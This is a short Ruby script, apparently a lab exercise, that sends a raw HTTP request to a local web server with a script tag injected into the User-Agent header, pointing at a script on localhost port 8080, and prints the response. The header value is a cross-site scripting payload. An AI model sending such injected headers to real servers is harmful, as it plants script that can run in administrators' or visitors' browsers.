#!/usr/bin/ruby
#=========================================================================================
# xss_client.rb
# Ronald Wochner 
# Tue May 30 08:20:52 PDT 2017
# Version 1
# Simple ruby script to explore network communications
#=========================================================================================

require 'socket'
host = 'localhost'
xss_loc = "< script src = 'http://localhost:8080/'></script>;"
naughty_request = "GET / HTTP/1.1
Host: #{host}
User-Agent: #{xss_loc}
\n\n"
s = TCPSocket.open('localhost',80)
s.print naughty_request
print "Got response:\n"
while line = s.gets
    print line
    break if line.downcase.include?'</html'
end
s.close()

